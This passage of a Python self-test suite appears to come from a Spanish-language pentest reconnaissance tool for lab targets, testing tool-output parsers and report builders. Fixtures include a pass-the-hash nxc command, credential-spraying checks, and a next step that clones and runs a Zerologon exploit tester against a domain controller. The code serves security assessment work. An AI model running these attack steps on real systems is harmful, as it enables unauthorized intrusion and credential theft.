        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
    _sh = next(c for c in _enr_cmds2 if "--shares" in c)
    assert "-H" in _sh and "-p" not in _sh                                # pass-the-hash: -H, no -p
    assert "31d6cfe0d16ae931b73c59d7e0c089c0" in _sh                      # el argv SÍ lo lleva (nxc lo exige literal — inevitable)
    _hcmds_shown = " ".join(s["cmd"] for s in _hres[0]["steps"])
    assert "31d6cfe0d16ae931b73c59d7e0c089c0" not in _hcmds_shown         # pero el comando GUARDADO (lo que ve el informe) lo enmascara
    assert "'***'" in _hcmds_shown

    # _run_capture_retry: reintenta SOLO si la salida viene completamente vacía (síntoma de
    # fallo transitorio de conexión, no de "no hay nada que reportar") — el caso real que
    # motivó esto: --shares/--pass-pol/--rid-brute con una credencial YA válida salieron
    # vacíos en un run real, pero el MISMO comando a mano, repetido, funcionó.
    _retry_calls = []

    def _fake_empty_then_ok(cmd, timeout=None, quiet=False, **kw):
        _retry_calls.append(cmd)
        return (0, "con contenido") if len(_retry_calls) > 1 else (1, "")
    globals()["run_capture"] = _fake_empty_then_ok
    try:
        _rc, _out = _run_capture_retry(["nxc", "smb", "x"], timeout=10)
    finally:
        globals()["run_capture"] = _real_run_capture
    assert len(_retry_calls) == 2 and _out == "con contenido"   # 1er intento vacío → reintenta → 2º sí tiene salida

    _retry_calls2 = []
    globals()["run_capture"] = lambda cmd, timeout=None, quiet=False, **kw: (_retry_calls2.append(cmd), (1, ""))[1]
    try:
        _rc2, _out2 = _run_capture_retry(["nxc", "smb", "x"], timeout=10)
    finally:
        globals()["run_capture"] = _real_run_capture
    assert len(_retry_calls2) == 2   # 1 intento + 1 reintento (retries=1 por defecto), no más
    assert "sin salida" in _out2 and "repite" in _out2   # sigue vacío tras reintentar: lo dice explícitamente, no "sin hallazgos"

    _retry_calls3 = []
    globals()["run_capture"] = lambda cmd, timeout=None, quiet=False, **kw: (_retry_calls3.append(cmd), (0, "ok a la primera"))[1]
    try:
        _run_capture_retry(["nxc", "smb", "x"], timeout=10)
    finally:
        globals()["run_capture"] = _real_run_capture
    assert len(_retry_calls3) == 1   # con salida real desde el 1er intento, NO reintenta

    # confirm_creds_spray: combo pequeño (<= umbral) no toca nada; combo grande SIN terminal
    # real tampoco debe bloquear ni mutar (ni llamar a input() — isatty forzado a False a
    # propósito, no hay forma segura de probar la rama interactiva sin arriesgar un selftest
    # colgado esperando stdin de verdad).
    _real_isatty = sys.stdin.isatty
    sys.stdin.isatty = lambda: False
    try:
        _ul2 = _tmpfile("\n".join(f"u{i}" for i in range(10)))
        _pl2 = _tmpfile("\n".join(f"p{i}" for i in range(10)))
        _small = _pc(user_list=_ul2, password="x")                        # 10×1 = 10, bajo el umbral
        confirm_creds_spray(_small)
        assert _small.user_list == _ul2                                   # no lo tocó
        _big = _pc(user_list=_ul2, pass_list=_pl2)                        # 10×10 = 100, sobre el umbral
        confirm_creds_spray(_big)                                         # no debe bloquear ni petar
        assert _big.user_list == _ul2 and _big.pass_list == _pl2          # sin terminal: avisa y sigue, no limpia
        # con varios objetivos no se comprueba la política de bloqueo de ninguno (no se
        # sabría de cuál avisar) — rama que nunca llama a nxc_bin()/toca la red.
        _multi = _pc(user_list=_ul2, pass_list=_pl2)
        confirm_creds_spray(_multi, targets=[("10.0.0.1", ""), ("10.0.0.2", "")])
        assert _multi.user_list == _ul2 and _multi.pass_list == _pl2
        os.unlink(_ul2); os.unlink(_pl2)
    finally:
        sys.stdin.isatty = _real_isatty
    assert sanitize("a\nb\tc\x07d") == "a\nb\tc d"
    assert looks_domain_joined([{"port": 445, "scripts": {}}], {"x": "Domain name: corp.local"})
    assert not looks_domain_joined([{"port": 445, "scripts": {}}], {"x": "Workgroup: WINMEDIUM"})
    _rd = "Retrieving endpoint list from 1.1.1.1\nProtocol: [MS-RSP]\nncalrpc:[LRPC-abc]\nncalrpc:[LRPC-def]"
    assert "MS-RSP" in _condense_rpcdump(_rd) and "+2 bindings ncalrpc" in _condense_rpcdump(_rd)
    # UDP open|filtered no se footprintea (falsos positivos); TCP open y UDP open sí
    assert _confirmed_open({"proto": "tcp", "state": "open"})
    assert _confirmed_open({"proto": "udp", "state": "open"})
    assert not _confirmed_open({"proto": "udp", "state": "open|filtered"})
    # WHOIS / crt.sh / wafw00f: parsers puros (sin red)
    _whois_out = ("Registrar: Amazon Registrar, Inc.\nCreation Date: 2019-08-05T22:43:09Z\n"
                  "Registry Expiry Date: 2024-08-05T22:43:09Z\nName Server: NS-1.AWSDNS-34.ORG\n"
                  "Name Server: NS-2.AWSDNS-05.CO.UK\n")
    _wi = _parse_whois(_whois_out)
    assert _wi["registrar"] == "Amazon Registrar, Inc." and _wi["created"] == "2019-08-05T22:43:09Z"
    assert _wi["expires"] == "2024-08-05T22:43:09Z" and len(_wi["ns"]) == 2
    assert _parse_whois("no matches found")["registrar"] is None
    assert _parse_wayback('[["original"],["http://example.com/old.php"],'
                           '["http://example.com/old.php"],["http://example.com/backup.zip"]]') == \
        ["http://example.com/backup.zip", "http://example.com/old.php"]   # dedup + sort, salta la cabecera
    assert _parse_wayback("") == []          # sin capturas: el CDX API devuelve "" (ni "[]")
    assert _parse_wayback("not json") == []  # respuesta no-JSON: no revienta
    # Regresión: JSON VÁLIDO pero que no es una lista (200 con "null" o un objeto — visto en
    # mantenimiento/rate-limit del CDX API) no debe reventar con TypeError al hacer rows[1:];
    # antes esa línea quedaba FUERA del try/except que solo protegía el json.loads.
    assert _parse_wayback("null") == []
    assert _parse_wayback('{"error": "rate limited"}') == []
    # hackertarget.com/hostsearch: CSV 'host,ip' por línea → hostnames únicos, en minúscula,
    # ordenados; dedup de líneas repetidas; los mensajes de error del free tier (cuota
    # agotada, dominio sin resultados) se tratan como "sin resultados", no como un parseo roto.
    assert _parse_hackertarget_hostsearch(
        "www.example.com,93.184.216.34\nAPI.example.com,93.184.216.35\n"
        "www.example.com,93.184.216.34\n") == ["api.example.com", "www.example.com"]
    assert _parse_hackertarget_hostsearch("") == []
    assert _parse_hackertarget_hostsearch("error check your search parameter") == []
    assert _parse_hackertarget_hostsearch("API count exceeded - Increase Quota with Membership") == []
    assert _parse_hackertarget_hostsearch("sin comas ni csv") == []
    # DNS: parser de registros de dig (salta comentarios ';'/vacías) + extracción de TXT (flags/secretos)
    _axfr = ("; <<>> DiG <<>>\n"
             'hr.inlanefreight.htb. 604800 IN SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n'
             'hr.inlanefreight.htb. 604800 IN TXT "HTB{flag_en_dns}"\n'
             'hr.inlanefreight.htb. 604800 IN NS ns.inlanefreight.htb.\n'
             "\n;; Query time: 1 msec")
    _axfr_recs = _dns_zone_records(_axfr)
    assert len(_axfr_recs) == 3 and all(not r.startswith(";") for r in _axfr_recs)   # 3 registros, 0 comentarios/vacías
    assert _dns_txt_values(_axfr_recs) == ["HTB{flag_en_dns}"]                        # el TXT (posible flag) se extrae
    assert _dns_txt_values(["x. IN NS ns.x.", "x. IN A 1.2.3.4"]) == []               # sin TXT → []
    assert _dns_zone_records("") == [] and _dns_zone_records(";; solo comentarios") == []
    # fp_dns_nameservers: `dig NS <dom> +short` → hostnames de los NS reales (sin el punto
    # final, en minúscula, dedupe) — esto es lo que permite atacar los NS de verdad
    # (ns1-3.<dominio>) en vez de limitarse al IP escaneado, que casi nunca ES el DNS.
    assert _parse_ns_records("ns1.inlanefreight.com.\nNS2.inlanefreight.com.\nns1.inlanefreight.com.\n") == \
        ["ns1.inlanefreight.com", "ns2.inlanefreight.com"]
    assert _parse_ns_records("") == [] and _parse_ns_records(";; connection timed out") == []
    # -D/--domain alias de --vhost: iguales/uno solo → ok; distintos → error (mismo campo)
    assert _reconcile_domain(None, "a.htb") == "a.htb"      # solo --domain
    assert _reconcile_domain("a.htb", None) == "a.htb"      # solo --vhost
    assert _reconcile_domain("a.htb", "a.htb") == "a.htb"   # ambos, iguales → ok
    assert _reconcile_domain(None, None) is None            # ninguno
    try:
        _reconcile_domain("a.htb", "b.htb"); assert False, "debería petar con dominios distintos"
    except ValueError:
        pass
    # SMTP user enum: parsea 'IP: user@dom exists' → parte local, dedup
    assert _parse_smtp_user_enum("10.129.18.136: marlin@inlanefreight.htb exists\n10.129.18.136: nope@x <no such user>") == ["marlin"]
    assert _parse_smtp_user_enum("1.2.3.4: john exists\n1.2.3.4: john exists") == ["john"]   # sin dominio + dedup
    assert _parse_smtp_user_enum("######## Scan started ########\n0 results.") == []
    # SMTP open relay: solo el positivo real (el negativo 'isn't an open relay' también lleva 'relay')
    assert _smtp_is_open_relay("Server is an open relay (14/16 tests)") is True
    assert _smtp_is_open_relay("Server isn't an open relay, authentication needed") is False
    assert _smtp_is_open_relay("") is False
    # Windows → wordlists -lowercase (URLs case-insensitive); Linux → se quedan igual
    assert _target_is_windows([{"port": 3389, "name": "ms-wbt-server", "scripts": {}}], {}) is True   # RDP
    assert _target_is_windows([{"port": 80, "name": "http", "product": "Apache httpd 2.4.53", "extrainfo": "Win64", "scripts": {}}], {}) is True
    assert _target_is_windows([], {"smb-os-discovery": "OS: Windows Server 2019 Standard"}) is True
    assert _target_is_windows([{"port": 80, "name": "http", "product": "Apache", "extrainfo": "Ubuntu", "scripts": {}}], {}) is False
    _wl_dir = Path(tempfile.mkdtemp())
    (_wl_dir / "d.txt").write_text("x", encoding="utf-8")
    (_wl_dir / "d-lowercase.txt").write_text("x", encoding="utf-8")
    (_wl_dir / "big.txt").write_text("x", encoding="utf-8")   # sin variante -lowercase
    assert _lowercase_wordlists([str(_wl_dir / "d.txt"), str(_wl_dir / "big.txt")]) == \
        [str(_wl_dir / "d-lowercase.txt"), str(_wl_dir / "big.txt")]
    assert _wafw00f_waf("[+] The site https://x is behind Wordfence (Defiant) WAF.") == "Wordfence (Defiant)"
    assert _wafw00f_waf("[+] No WAF detected by the generic detection") is None
    assert {p for p, *_ in WEB_WELL_KNOWN} == {".well-known/security.txt", ".well-known/openid-configuration"}
    assert _robots_paths("User-agent: *\nAllow: /index.html\nDisallow: /admin_h1dd3n\n") == \
        ["/index.html", "/admin_h1dd3n"]
    assert _robots_paths("Disallow: /x\ndisallow: /x\nDISALLOW: /y") == ["/x", "/y"]  # dedup, case-insensitive
    assert _robots_paths("") == [] and _robots_paths("User-agent: *\n") == []
    assert _parse_ports("80, 443,80,abc,99999") == [80, 443]                # dedup + descarta inválidos
    assert _parse_hostnames(" App.X.local, dev.x.local ,,App.x.local") == ["app.x.local", "dev.x.local"]
    _nikto_sample = "+ 1316 requests: 0 error(s) and 12 item(s) reported on remote host"
    _m = re.search(r"(\d+)\s+item\(s\)\s+reported\s+on\s+remote\s+host", _nikto_sample)
    assert _m and int(_m.group(1)) == 12
    # --cms-scan: detección de CMS (puro) + parseo de wpscan -f json (tolerante a JSON roto)
    assert _detect_cms("HTTPServer[Apache], WordPress[6.4.2], PHP[8.1]") == "wordpress"
    assert _detect_cms("MetaGenerator[Joomla! - Open Source CMS]") == "joomla"
    assert _detect_cms("Apache, PHP") is None
    # _whatweb_products: solo tokens con firma propia ('Nombre[valor]'), sin el ruido
    # de fingerprinting (jQuery/cookies/IP...) ni duplicados, orden de aparición.
    _ww = ("Country[RESERVED][ZZ], IP[10.129.202.136], HTTPServer[Apache/2.4.41], "
           "Apache[2.4.41], JQuery[3.5.1], PHP[7.4.3], Title[Welcome], Jenkins[2.303], "
           "Cookies[JSESSIONID], X-Powered-By[PHP/7.4.3], Apache[2.4.41]")
    assert _whatweb_products(_ww) == ["Apache", "PHP", "Jenkins"]   # HTTPServer fuera: repite Apache sin aportar nada
    assert _whatweb_products("WordPress[6.4.2], Apache[2.4.41]", exclude={"wordpress"}) == ["Apache"]
    assert _whatweb_products("sin tokens con corchetes aquí") == []
    # _CREDS_SEARCH_IGNORE: Apache/PHP/nginx... nunca son "el panel de login" -> fuera de la búsqueda de creds
    assert _whatweb_products(_ww, exclude=_CREDS_SEARCH_IGNORE) == ["Jenkins"]
    # creds search: parser puro de la tabla ASCII (formato real confirmado en vivo)
    _creds_tbl = ("+---------+----------+----------+\n"
                  "| Product | username | password |\n"
                  "+---------+----------+----------+\n"
                  "| tomcat  |  admin   |  admin   |\n"
                  "| tomcat  |  admin   | <blank>  |\n"
                  "+---------+----------+----------+")
    assert _parse_creds_search(_creds_tbl) == [("tomcat", "admin", "admin"), ("tomcat", "admin", "")]
    assert _parse_creds_search("[-] Product not found in database 🦕") == []
    assert _parse_creds_search("") == []
    assert _wpscan_summary("not json") is None
    _wp_json = json.dumps({
        "version": {"number": "6.4.2", "vulnerabilities": [{"title": "X"}]},
        "plugins": {"akismet": {"vulnerabilities": [{"title": "Y"}, {"title": "Z"}]}},
        "themes": {"twentytwenty": {"vulnerabilities": []}},
        "users": {"admin": {}, "editor": {}},
    })
    _wps = _wpscan_summary(_wp_json)
    assert _wps["total_vulns"] == 3 and _wps["users"] == ["admin", "editor"]
    assert ("core 6.4.2", 1) in _wps["components"] and ("akismet", 2) in _wps["components"]
    # --crawl: parseo del jsonl de katana (esquema real: URL en request.endpoint,
    # formularios en response.forms — verificado en vivo contra inlanefreight.com)
    _katana_jsonl = "\n".join([
        json.dumps({"request": {"endpoint": "http://x.com/"}, "response": {"status_code": 200}}),
        "not json, línea rota",
        json.dumps({"request": {"endpoint": "http://x.com/app.js", "tag": "script"}, "response": {"status_code": 200}}),
        json.dumps({"request": {"endpoint": "http://x.com/login"},
                    "response": {"status_code": 200, "forms": [{"method": "POST", "action": "/login"}]}}),
    ])
    _kr = _parse_katana_jsonl(_katana_jsonl)
    assert _kr["urls"] == ["http://x.com/", "http://x.com/app.js", "http://x.com/login"]
    assert _kr["forms"] == ["http://x.com/login"]
    assert _parse_katana_jsonl("")["urls"] == []
    # --nuclei: parseo del jsonl (tolerante a líneas no-JSON) + orden/mapeo de severidad
    _nuclei_jsonl = "\n".join([
        json.dumps({"template-id": "tls-version", "info": {"name": "TLS", "severity": "low"}, "matched-at": "x:443"}),
        "banner no-json de nuclei",
        json.dumps({"template-id": "CVE-2021-1234", "info": {"name": "RCE", "severity": "critical"}, "matched-at": "http://x/"}),
        json.dumps({"template-id": "exposed-panel", "info": {"name": "Panel", "severity": "medium"}, "host": "http://x/adm"}),
    ])
    _ns = _nuclei_summary(_nuclei_jsonl)
    assert [h["id"] for h in _ns] == ["CVE-2021-1234", "exposed-panel", "tls-version"]  # critica<media<info
    assert _ns[0]["sev"] == "critica" and _ns[2]["sev"] == "info" and _ns[2]["raw"] == "low"
    assert _ns[1]["at"] == "http://x/adm"      # cae a 'host' si no hay matched-at
    assert _nuclei_summary("") == [] and _nuclei_summary("solo texto") == []
    assert _extract_emails_comments("contact: 1337testing@inlanefreight.htb por favor")[0] == \
        ["1337testing@inlanefreight.htb"]
    assert _extract_emails_comments("<!-- Remember to change the API key to abc123 -->")[1] == \
        ["Remember to change the API key to abc123"]
    assert _extract_emails_comments("<!--\n  multilinea\n  de verdad\n-->")[1] == ["multilinea\n  de verdad"]
    assert _extract_emails_comments("sin nada de esto") == ([], [])
    assert _extract_emails_comments("a@b.com y a@b.com repetido")[0] == ["a@b.com"]  # dedup
    _vh = [("x.local", [{"host": "app.x.local", "status": "-", "length": "-"},
                        {"host": "dev.x.local", "status": "-", "length": "-"}])]
    assert fp_vhost_web("10.0.0.1", [], _vh)["findings"] == []               # sin webs: no hay nada que fingerprintear
    # chown: sin SUDO_UID no hay usuario real que devolver (no-op, no revienta)
    _su = os.environ.pop("SUDO_UID", None)
    assert _real_user_ids() is None
    if _su is not None:
        os.environ["SUDO_UID"] = _su
    rid_out = ("SMB 10.10.10.10 445 DC01 500: HTB\\Administrator (SidTypeUser)\n"
               "SMB 10.10.10.10 445 DC01 501: HTB\\Guest (SidTypeUser)\n"
               "SMB 10.10.10.10 445 DC01 512: HTB\\Domain Admins (SidTypeGroup)")
    assert re.findall(r"\d+:\s+[^\s\\]+\\(.+?)\s+\(SidTypeUser\)", rid_out) == ["Administrator", "Guest"]
    assert _h("<script>") == "&lt;script&gt;"
    fb = _html_findings_block([("alta", "x"), ("info", "y")])
    assert fb.index("ALTA") < fb.index("INFO")                          # ordenado por severidad

    # searchsploit: construcción de términos y parseo de JSON (sin tocar la red)
    assert _ss_terms("OpenSSH", "8.2p1") == ["OpenSSH 8.2p1", "OpenSSH 8.2"]
    assert _ss_terms("vsftpd", "3.0.3") == ["vsftpd 3.0.3", "vsftpd 3.0"]
    # "apache" es vendor genérico: NO cae al nombre a secas ("Apache 2.4.x" cuela
    # Tomcat/mod_ssl/CXF/Xerces, nada que ver) → se queda en "Apache httpd ...".
    assert _ss_terms("Apache httpd", "2.4.29") == ["Apache httpd 2.4.29", "Apache httpd 2.4"]
    assert _ss_terms("Apache httpd", "") == ["Apache httpd"]
    assert "Apache" not in _ss_terms("Apache Tomcat", "9.0.30")          # Tomcat se queda específico
    assert _ss_terms("", "1.0") == []
    # mega-vendor genérico: nunca cae al nombre a secas ("Microsoft" → 2000+ ruido)
    assert _ss_terms("Microsoft Windows netbios-ssn", "") == ["Microsoft Windows netbios-ssn"]
    assert _ss_terms("Microsoft SQL Server 2019", "15.00.2000.00") == \
        ["Microsoft SQL Server 2019 15.00.2000.00", "Microsoft SQL Server 2019 15.00"]
    assert "Microsoft" not in _ss_terms("Microsoft Windows RPC", "")
    # "Cloudflare http proxy" (nmap -sV tras su WAF) a secas colaba EDB-50805 (Cloudflare
    # WARP, cliente de escritorio Windows) — visto en vivo contra HostGator LATAM
    assert _ss_terms("Cloudflare http proxy", "") == ["Cloudflare http proxy"]
    ssj = ('{"RESULTS_EXPLOIT":[{"Title":"vsftpd 2.3.4 - Backdoor Command Execution",'
           '"EDB-ID":"17491","Path":"/x","Platform":"unix","Type":"remote"}]}')
    pss = _ss_parse(ssj)
    assert pss and pss[0]["edb"] == "17491" and pss[0]["title"].startswith("vsftpd")
    assert pss[0]["sev"] == "critica"                                   # backdoor/command exec → crítica
    assert _ss_parse("basura sin json") == [] and _ss_parse("") == []
    # _ss_parse dedupe por EDB-ID: confirmado en un run real contra un término genérico
    # ('Microsoft Windows RPC') que searchsploit -j puede devolver el MISMO EDB-ID dos
    # veces dentro de RESULTS_EXPLOIT — sin dedupe se cuela dos veces en la lista Y en
    # el conteo "N exploits" (que usa len() directo). Se queda la 1ª aparición.
    _dup_ssj = ('{"RESULTS_EXPLOIT":['
                '{"Title":"A - Net-NTLMv2 Reflection","EDB-ID":"45562","Type":"remote"},'
                '{"Title":"B - otro exploit","EDB-ID":"69","Type":"remote"},'
                '{"Title":"A - Net-NTLMv2 Reflection","EDB-ID":"45562","Type":"remote"}]}')
    _dup_pss = _ss_parse(_dup_ssj)
    assert len(_dup_pss) == 2 and [e["edb"] for e in _dup_pss] == ["45562", "69"]
    # sin EDB-ID (Codes vacío): dedupe por título en vez de colapsar todo a key=""
    _noedb_ssj = ('{"RESULTS_EXPLOIT":['
                  '{"Title":"X","Codes":"","Type":"remote"},'
                  '{"Title":"Y","Codes":"","Type":"remote"}]}')
    assert len(_ss_parse(_noedb_ssj)) == 2

    # vuln_search: el mismo product+version puede salir en tcp Y udp con el MISMO número
    # de puerto (confirmado en un run real: 'Simple DNS Plus' en 53/tcp y 53/udp) — las
    # líneas de exploits.py agrupan por (product, version) sin mirar el protocolo, así que
    # sin dedupe el puerto se repetía en la etiqueta "(53,53)". nxc/searchsploit mockeados
    # (sin red): basta con que 'ports' salga deduplicado.
    _real_have, _real_ss1 = have, searchsploit_one
    globals()["have"] = lambda name: True
    globals()["searchsploit_one"] = lambda term: []
    try:
        _dns_svcs = [{"port": 53, "proto": "tcp", "name": "domain", "product": "Simple DNS Plus",
                      "version": "", "extrainfo": "", "scripts": {}},
                     {"port": 53, "proto": "udp", "name": "domain", "product": "Simple DNS Plus",
                      "version": "", "extrainfo": "", "scripts": {}}]
        _dns_vulns = vuln_search(_dns_svcs)
    finally:
        globals()["have"], globals()["searchsploit_one"] = _real_have, _real_ss1
    assert _dns_vulns and _dns_vulns[0]["ports"] == [53]                 # no [53, 53]
    # vhost catch-all: el hit cuya firma == la del control (Host aleatorio) se descarta
    _vh_hits = [{"host": "real.x"}, {"host": "catch.x"}]
    _vh_sig = {"real.x": (200, 120, "A"), "catch.x": (301, 20, "B")}
    assert _drop_catchall(_vh_hits, (301, 20, "B"), lambda h: _vh_sig[h["host"]]) == [{"host": "real.x"}]
    assert _drop_catchall(_vh_hits, (None, 0, ""), lambda h: _vh_sig[h["host"]]) == _vh_hits  # sin baseline: no filtra
    # dedup web: un HTTP que redirige a HTTPS es espejo de 443; sin puerto https no colapsa
    _wm = [fake(name="http", port=80), fake(name="https", port=443)]
    assert _mirror_map(_wm, lambda p: "https://x/" if p["port"] == 80 else "") == {80: 443}
    assert _mirror_map(_wm, lambda p: "") == {}
    assert _mirror_map([fake(name="http", port=80)], lambda p: "https://x/") == {}
    # heurística de criticidad
    assert _exploit_severity("Remote Code Execution", "remote") == "critica"
    assert _exploit_severity("Local Privilege Escalation", "local") == "alta"
    assert _exploit_severity("SQL Injection", "webapps") == "alta"
    assert _exploit_severity("Denial of Service (DoS)", "dos") == "baja"
    assert _exploit_severity("Reflected XSS", "webapps") == "media"
    assert _exploit_severity("Something generic remote", "remote") == "alta"

    fprs = [{"proto": "smb", "title": "SMB", "ports": [445],
             "steps": [{"cmd": "smbclient -N -L //x", "ok": True, "output": "share", "note": "n"}],
             "findings": [("alta", "share READ")], "next": ["do X"], "missing": ["smbmap"]},
            {"proto": "whois", "title": "WHOIS", "ports": [],   # ports=[]: fp_whois/fp_ctlogs (ligados
             "steps": [], "findings": [("info", "WHOIS x.com — registrador: Foo")],   # al dominio, no a un puerto)
             "next": [], "missing": []}]
    vlns = [{"ports": [21], "service": "ftp", "product": "vsftpd", "version": "2.3.4",
             "term": "vsftpd 2.3.4", "exploits": [{"title": "vsftpd 2.3.4 - Backdoor Command Execution",
             "edb": "17491", "path": "/x", "platform": "unix", "type": "remote", "sev": "critica"}]}]
    # web_hits con clave int (puerto, Fase 6) y str "fqdn:puerto" (Fase 7b, dir-fuzz por vhost)
    web_fix = {80: [{"path": "admin", "status": 200, "length": 12}],
               "dev.inlanefreight.htb:80": [{"path": "secret", "status": 200, "length": 7}]}
    vhost_fix = [("inlanefreight.htb", [{"host": "dev.inlanefreight.htb", "status": 200, "length": 9}])]
    doc = build_html("10.10.10.10", ports, host, fprs, vlns, ["inlanefreight.htb"],
                     web_fix, vhost_fix, None, "2026-01-01 00:00")
    assert "Puerto 80 — directorios" in doc and "vhost dev.inlanefreight.htb:80 — directorios" in doc
    for needle in ("<!DOCTYPE html>", "palantir", "SMB", "share READ", "/admin",
                   "dev.inlanefreight.htb", "10.10.10.10", "EDB-17491", "searchsploit",
                   "badge critica", "CRITICA", "Criticidad"):
        assert needle in doc, f"falta '{needle}' en el HTML"
    assert doc.count("<details") >= 4
    assert "Quick wins" in doc   # fprs tiene un hallazgo 'alta' → debe salir la caja
    assert 'class="tip"' in doc and "NETLOGON" in doc   # "share READ" trae su tip (qué hacer A MANO)
    assert "WHOIS" in doc and "registrador: Foo" in doc   # footprint con ports=[] (fp_whois/fp_ctlogs) también sale

    # Informe PRELIMINAR (pre-fuzzing): banner + meta-refresh solo con preliminary=True
    doc_pre = build_html("10.10.10.10", ports, host, fprs, vlns, ["inlanefreight.htb"],
                         {}, [], None, "2026-01-01 00:00", preliminary=True)
    assert 'http-equiv="refresh"' in doc_pre and "Informe preliminar" in doc_pre
    assert "· preliminar" in doc_pre
    assert 'http-equiv="refresh"' not in doc and 'class="prelim"' not in doc   # el definitivo no los lleva
    md_pre = build_markdown("10.10.10.10", ports, host, fprs, vlns, [], {}, [], None,
                            "2026-01-01 00:00", preliminary=True)
    assert "Informe preliminar" in md_pre and "preliminar (fuzzing en curso)" in md_pre

    # Regresión: con --no-fuzz el fuzzing NUNCA se lanza, así que el aviso "preliminar" no
    # puede decir que "sigue en marcha" (bug real: con --no-fuzz la página se quedaba
    # anunciando una fase que jamás iba a correr, mientras footprint/credenciales —lo que de
    # verdad faltaba— terminaban). Con no_fuzz=True, ni el HTML ni el MD mencionan fuzzing.
    doc_pre_nf = build_html("10.10.10.10", ports, host, fprs, vlns, ["inlanefreight.htb"],
                            {}, [], None, "2026-01-01 00:00", preliminary=True, no_fuzz=True)
    assert 'http-equiv="refresh"' in doc_pre_nf and "Informe preliminar" in doc_pre_nf
    assert "--no-fuzz" in doc_pre_nf   # dice POR QUÉ no hay fuzzing...
    assert "fuzzing web/vhost" not in doc_pre_nf and "sigue en marcha" not in doc_pre_nf   # ...pero no que "siga en marcha"
    assert "recon en curso" in doc_pre_nf and "fuzzing en curso" not in doc_pre_nf
    md_pre_nf = build_markdown("10.10.10.10", ports, host, fprs, vlns, [], {}, [], None,
                               "2026-01-01 00:00", preliminary=True, no_fuzz=True)
    assert "--no-fuzz" in md_pre_nf
    assert "fuzzing web/vhost" not in md_pre_nf and "sigue en marcha" not in md_pre_nf
    assert "recon en curso" in md_pre_nf and "fuzzing en curso" not in md_pre_nf

    # Orden de severidad (crítica primero) y utilidades nuevas, sin tocar la red
    assert SEV_ORDER["critica"] < SEV_ORDER["alta"] < SEV_ORDER["media"] < SEV_ORDER["info"]
    shares_out = ("SMB 10.10.10.10 445 HOST Share     Permissions  Remark\n"
                  "SMB 10.10.10.10 445 HOST ADMIN$                 Remote Admin\n"
                  "SMB 10.10.10.10 445 HOST IPC$      READ         Remote IPC\n"
                  "SMB 10.10.10.10 445 HOST Users     READ\n"
                  "SMB 10.10.10.10 445 HOST Backups   READ,WRITE")
    assert _smb_readable_shares(shares_out) == ["Users", "Backups"]
    spider_out = (
        "  id_rsa               A  1500  Tue Feb 25 13:03:22 2020\n"
        "  readme.md            A    10  Tue Feb 25 13:03:22 2020\n"
        "  contents             D     0  Mon Nov  8 14:43:45 2021\n"
        "\\contents\n"
        "  flag.txt             N    38  Mon Nov  8 14:43:45 2021\n"
        "  web.config           A    20  Mon Nov  8 14:43:45 2021\n"
        "\t\t4062912 blocks of size 1024. 414232 blocks available")
    loot = _interesting_files(spider_out)
    assert loot == ["id_rsa", "contents\\flag.txt", "contents\\web.config"], loot
    assert _ANSI_RE.sub("", "\x1b[92menum\x1b[0m\x1b[94m[*]\x1b[0m") == "enum[*]"
    qw = quick_wins([{"title": "SMB", "ports": [445], "steps": [],
                      "findings": [("alta", "share READ"), ("critica", "Pwn3d!")],
                      "next": ["cmd1", "cmd2"], "missing": []}])
    assert qw and qw[0]["sev"] == "critica" and qw[0]["cmds"][0] == "cmd1"
    # _cmds_for (vía quick_wins): el next-step con el MISMO CVE/nombre de ataque que el hallazgo
    # va PRIMERO, no el que resulte estar antes en res["next"] por orden de ejecución — bug real:
    # en un DC, fp_smb añade el next-step de RID cycling (sin relación) ANTES que el de explotar
    # Zerologon, así que el quick win de Zerologon enseñaba 'rpcclient: queryuser <RID>' como 1er
    # comando y el exploit de verdad (zerologon_tester.py) como 2º.
    qw_zero = quick_wins([{"title": "SMB / RPC", "ports": [445], "steps": [],
                           "findings": [("critica", "SMB: Zerologon (CVE-2020-1472) — el DC es "
                                        "VULNERABLE (comprobado, sin credenciales)")],
                           "next": ["rpcclient: 'queryuser <RID>' / brute de RIDs con seq+queryuser",
                                    "git clone https://github.com/SecuraBV/CVE-2020-1472 && "
                                    "python3 CVE-2020-1472/zerologon_tester.py NETBIOS-DEL-DC 10.0.0.1"],
                           "missing": []}])
    assert "CVE-2020-1472" in qw_zero[0]["cmds"][0]   # el exploit de Zerologon primero…
    assert "queryuser" in qw_zero[0]["cmds"][1]        # …el RID cycling (sin relación) después, no se pierde
    # sin ningún next-step que casara, sigue cayendo al orden original (hallazgo genérico)
    assert _cmds_for("Puerto 80 abierto", ["a", "b", "c", "d"]) == ["a", "b", "c"]
    # _tip_for: "qué hacer A MANO" por categoría de hallazgo — pedido explícito para uso en
    # OSCP (nada de explotación automatizada). Puro, por coincidencia de texto; cada win de
    # quick_wins() lleva su "tip" ya resuelto (None si ninguna categoría aplica).
    assert _tip_for("SMB: Zerologon (CVE-2020-1472) — el DC es VULNERABLE") is not None
    assert _tip_for("LDAP (cred alice): ¡DCSync permitido! hash de krbtgt recuperado (...)") is not None
    assert _tip_for("Puerto 80 abierto") is None   # texto sin ninguna categoría conocida → sin tip, no inventa nada
    assert all(w.get("tip") for w in qw), qw   # "Pwn3d!" y "share READ" SÍ tienen tip en este fixture
    assert not qw[0]["tip"].startswith("$") and "\n" not in qw[0]["tip"]   # prosa, nunca un comando a pegar
    # _known_web_product: banner genérico de nmap, el título SÍ delata el producto
    web_svc = [{"port": 5000, "proto": "tcp", "name": "http",
                "product": "Microsoft HTTPAPI httpd", "version": "2.0",
                "scripts": {"http-title": "FortiLogger | Log and Report System"}}]
    kw = _known_web_product(web_svc)
    assert kw == (5000, "FortiLogger", KNOWN_VULN_WEB_PRODUCTS[0][2])
    assert _known_web_product([{"port": 80, "proto": "tcp", "name": "http",
                                "product": "Apache", "version": "",
                                "scripts": {"http-title": "Welcome"}}]) is None
    qw_known = quick_wins([], [{"ports": [5000], "service": "http", "product": "FortiLogger",
                                "version": "", "term": "FortiLogger", "exploits": [],
                                "known": True, "known_note": "RCE sin autenticación"}])
    assert qw_known and qw_known[0]["sev"] == "critica" and "FortiLogger" in qw_known[0]["title"]
    assert qw_known[0].get("tip") is None   # producto conocido sin categoría propia: no inventa un tip genérico
    # _detect_win_build + rebaja de exploits de SO antiguo contra un host moderno
    win10_svc = [{"port": 3389, "scripts": {"rdp-ntlm-info": "Product_Version: 10.0.17763"}}]
    assert _detect_win_build(win10_svc) == 17763
